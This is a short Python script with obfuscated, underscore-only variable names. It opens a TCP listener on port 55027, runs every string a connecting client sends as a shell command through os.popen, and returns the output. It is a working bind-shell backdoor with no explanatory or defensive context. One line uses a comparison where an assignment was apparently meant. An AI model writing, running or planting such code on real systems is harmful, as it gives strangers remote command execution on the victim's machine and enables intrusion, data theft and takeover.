import socket,sys,os,time
time.sleep(5)
try:
    __________ = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    __________.connect(("8.8.8.8",80))
    ____________=__________.getsockname()[0]
    __________.close()
except:
    ____________="127.0.0.1"
___________=55027
__________=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    __________.bind((____________,___________))
except socket.error:
    sys.exit()
while True:
    try:
        __________.listen(2)
        _____________,_________=__________.accept();_________=""
        while True:
            ______________=_____________.recv(1024).decode("Utf8")
            if ______________.upper()=="FIN" or ______________=="":
                break
            else:
                ______________=os.popen(______________).read()
                if ______________=="":
                    ______________=="OK"
                _____________.send(______________.encode("Utf8"))
                time.sleep(5)
                ______________="ex"
                _____________.send(______________.encode("Utf8"))
    except:
        pass
